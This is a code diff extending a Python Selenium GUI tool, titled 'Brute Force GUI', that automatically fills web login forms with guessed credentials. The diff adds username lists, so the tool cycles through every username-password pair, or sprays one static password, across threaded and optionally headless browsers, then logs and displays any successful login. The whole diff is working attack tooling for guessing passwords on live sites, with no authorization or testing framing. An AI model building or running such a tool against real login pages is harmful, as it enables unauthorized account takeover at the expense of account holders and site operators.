@@ -22,11 +22,43 @@ max_threads = 1
 # Config file path
 CONFIG_FILE = "settings.json"
 
+# GUI setup
+root = tk.Tk()
+root.title("Brute Force GUI (Auto Detect Login Fields)")
+
+frame = tk.Frame(root)
+frame.pack(padx=10, pady=10)
+
+# Username and password list checkbox toggle
+use_username_file_var = tk.BooleanVar(value=False)
+use_password_file_var = tk.BooleanVar(value=True)
+
+def toggle_username_input():
+    if use_username_file_var.get():
+        username_file_entry.config(state="normal")
+        username_file_browse.config(state="normal")
+        username_entry.config(state="disabled")
+    else:
+        username_file_entry.config(state="disabled")
+        username_file_browse.config(state="disabled")
+        username_entry.config(state="normal")                                             
+def toggle_password_input():
+    if use_password_file_var.get():
+        password_file_entry.config(state="normal")
+        password_file_browse.config(state="normal")
+        static_password_entry.config(state="disabled")
+    else:
+        password_file_entry.config(state="disabled")
+        password_file_browse.config(state="disabled")
+        static_password_entry.config(state="normal")
+
 def save_settings():
     settings = {
         "url": url_entry.get(),
         "username": username_entry.get(),
+        "username_file": username_file_entry.get(),
         "password_file": password_file_entry.get(),
+        "static_password": static_password_entry.get(),
         "threads": thread_count_entry.get(),
         "headless": headless_var.get(),
         "delay": delay_entry.get()
@@ -40,7 +72,9 @@ def load_settings():
             settings = json.load(f)
             url_entry.insert(0, settings.get("url", ""))
             username_entry.insert(0, settings.get("username", ""))
+            username_file_entry.insert(0, settings.get("username_file", ""))
             password_file_entry.insert(0, settings.get("password_file", ""))
+            static_password_entry.insert(0, settings.get("static_password", ""))
             thread_count_entry.delete(0, tk.END)
             thread_count_entry.insert(0, settings.get("threads", "1"))
             delay_entry.delete(0, tk.END)
@@ -52,10 +86,10 @@ def clear_settings():
         os.remove(CONFIG_FILE)
         messagebox.showinfo("Settings", "Saved settings deleted.")
 
-def browse_file():
+def browse_file(entry):
     file_path = filedialog.askopenfilename()
-    password_file_entry.delete(0, tk.END)
-    password_file_entry.insert(0, file_path)
+    entry.delete(0, tk.END)
+    entry.insert(0, file_path)
 
 def find_login_fields(driver):
     try:
@@ -85,14 +119,14 @@ def log_to_file(url, username, password, result, response_time):
     with open("bruteforce_log.txt", "a") as log_file:
         log_file.write(log_line + "\n")
 
-def brute_force_worker(password_queue, url, username, chrome_options):
+def brute_force_worker(creds_queue, url, chrome_options):
     service = Service('chromedriver.exe')
     driver = webdriver.Chrome(service=service, options=chrome_options)
-    while not password_queue.empty() and is_running:
+    while not creds_queue.empty() and is_running:
         if is_paused:
             time.sleep(0.5)
             continue
-        pw = password_queue.get()
+        username, pw = creds_queue.get()
         start_time = time.time()
         result = "Failed"
         log(f"Trying: {username}:{pw}")
@@ -117,7 +151,7 @@ def brute_force_worker(password_queue, url, username, chrome_options):
                 break
             if result == "Success":
                 log(f"✅ SUCCESS! Password found: {pw}")
-                messagebox.showinfo("Success", f"Password found: {pw}")
+                messagebox.showinfo("Success", f"Username: {username}\nPassword: {pw}")
                 break
         except Exception as e:
             result = f"Error: {str(e)}"
@@ -136,22 +170,51 @@ def brute_force():
     is_paused = False
     save_settings()
     url = url_entry.get()
-    username = username_entry.get()
     password_file = password_file_entry.get()
-    if not os.path.isfile(password_file):
-        messagebox.showerror("File Error", "Password file not found.")
-        return
-    with open(password_file, "r") as f:
-        passwords = [line.strip() for line in f if line.strip()]
-    password_queue = Queue()
-    for pw in passwords:
-        password_queue.put(pw)
+    username_file = username_file_entry.get()
+    static_password = static_password_entry.get()
+    single_username = username_entry.get()
+    creds_queue = Queue()
+
+    if username_file:
+        if not os.path.isfile(username_file):
+            messagebox.showerror("File Error", "Username file not found.")
+            return
+        with open(username_file, "r") as f:
+            usernames = [line.strip() for line in f if line.strip()]
+        if use_password_file_var.get():
+            if not os.path.isfile(password_file):
+                messagebox.showerror("File Error", "Password file not found.")
+                return
+            with open(password_file, "r") as f:
+                passwords = [line.strip() for line in f if line.strip()]
+            for u in usernames:
+                for p in passwords:
+                    creds_queue.put((u, p))
+        else:
+            for u in usernames:
+                creds_queue.put((u, static_password))
+    else:
+        if not single_username:
+            messagebox.showerror("Input Error", "Please provide a username or username file.")
+            return
+        if use_password_file_var.get():
+            if not os.path.isfile(password_file):
+                messagebox.showerror("File Error", "Password file not found.")
+                return
+            with open(password_file, "r") as f:
+                passwords = [line.strip() for line in f if line.strip()]
+            for p in passwords:
+                creds_queue.put((single_username, p))
+        else:
+            creds_queue.put((single_username, static_password))
+
     chrome_options = Options()
     if headless_var.get():
         chrome_options.add_argument("--headless")
     threads = []
-    for _ in range(min(max_threads, password_queue.qsize())):
-        t = threading.Thread(target=brute_force_worker, args=(password_queue, url, username, chrome_options))
+    for _ in range(min(max_threads, creds_queue.qsize())):
+        t = threading.Thread(target=brute_force_worker, args=(creds_queue, url, chrome_options))
         threads.append(t)
         t.start()
     for t in threads:
@@ -181,13 +244,6 @@ def log(message):
     output_text.insert(tk.END, message + "\n")
     output_text.see(tk.END)
 
-# GUI setup
-root = tk.Tk()
-root.title("Brute Force GUI (Auto Detect Login Fields)")
-
-frame = tk.Frame(root)
-frame.pack(padx=10, pady=10)
-
 # URL
 tk.Label(frame, text="Target URL:").grid(row=0, column=0, sticky="e")
 url_entry = tk.Entry(frame, width=60)
@@ -198,33 +254,52 @@ tk.Label(frame, text="Username:").grid(row=1, column=0, sticky="e")
 username_entry = tk.Entry(frame, width=60)
 username_entry.grid(row=1, column=1, columnspan=2)
 
+# Username file
+tk.Label(frame, text="Use username list:").grid(row=2, column=0, sticky="e")
+tk.Checkbutton(frame, variable=use_username_file_var, command=toggle_username_input).grid(row=2, column=1, sticky="w")
+
+username_file_entry = tk.Entry(frame, width=50)
+username_file_entry.grid(row=3, column=1)
+username_file_browse = tk.Button(frame, text="Browse", command=lambda: browse_file(username_file_entry))
+username_file_browse.grid(row=3, column=2)
+
+# Password source selector
+tk.Label(frame, text="Use password list:").grid(row=4, column=0, sticky="e")
+tk.Checkbutton(frame, variable=use_password_file_var, command=toggle_password_input).grid(row=4, column=1, sticky="w")
+
 # Password file
-tk.Label(frame, text="Password file:").grid(row=2, column=0, sticky="e")
+tk.Label(frame, text="Password file:").grid(row=5, column=0, sticky="e")
 password_file_entry = tk.Entry(frame, width=50)
-password_file_entry.grid(row=2, column=1)
-tk.Button(frame, text="Browse", command=browse_file).grid(row=2, column=2)
+password_file_entry.grid(row=5, column=1)
+password_file_browse = tk.Button(frame, text="Browse", command=lambda: browse_file(password_file_entry))
+password_file_browse.grid(row=5, column=2)
+
+# Static password
+tk.Label(frame, text="Static password:").grid(row=6, column=0, sticky="e")
+static_password_entry = tk.Entry(frame, width=60)
+static_password_entry.grid(row=6, column=1, columnspan=2)
 
 # Threads
-tk.Label(frame, text="Threads (1-10):").grid(row=3, column=0, sticky="e")
+tk.Label(frame, text="Threads (1-10):").grid(row=7, column=0, sticky="e")
 thread_count_entry = tk.Entry(frame, width=5)
 thread_count_entry.insert(0, "1")
-thread_count_entry.grid(row=3, column=1, sticky="w")
+thread_count_entry.grid(row=7, column=1, sticky="w")
 
 # Delay between attempts
-tk.Label(frame, text="Delay (sec):").grid(row=4, column=0, sticky="e")
+tk.Label(frame, text="Delay (sec):").grid(row=8, column=0, sticky="e")
 delay_entry = tk.Entry(frame, width=5)
 delay_entry.insert(0, "1")
-delay_entry.grid(row=4, column=1, sticky="w")
+delay_entry.grid(row=8, column=1, sticky="w")
 
 # Headless mode
 headless_var = tk.BooleanVar()
-tk.Checkbutton(frame, text="Run in headless mode", variable=headless_var).grid(row=4, column=2, sticky="w")
+tk.Checkbutton(frame, text="Run in headless mode", variable=headless_var).grid(row=8, column=2, sticky="w")
 
 # Controls
-tk.Button(frame, text="Start", width=10, command=start_attack).grid(row=5, column=0, pady=10)
-tk.Button(frame, text="Pause/Resume", width=15, command=pause_attack).grid(row=5, column=1)
-tk.Button(frame, text="Stop", width=10, command=stop_attack).grid(row=5, column=2)
-tk.Button(frame, text="Clear Settings", command=clear_settings).grid(row=6, column=1, pady=(0, 10))
+tk.Button(frame, text="Start", width=10, command=start_attack).grid(row=9, column=0, pady=10)
+tk.Button(frame, text="Pause/Resume", width=15, command=pause_attack).grid(row=9, column=1)
+tk.Button(frame, text="Stop", width=10, command=stop_attack).grid(row=9, column=2)
+tk.Button(frame, text="Clear Settings", command=clear_settings).grid(row=10, column=1, pady=(0, 10))
 
 # Output box
 output_text = tk.Text(root, height=15, width=100)
@@ -237,5 +312,9 @@ credit.bind("<Button-1>", lambda e: webbrowser.open_new("https://github.com/dark
 
 # Load saved settings
 load_settings()
+
+# Initialize toggle state
+toggle_username_input()                       
+toggle_password_input()
 
 root.mainloop()
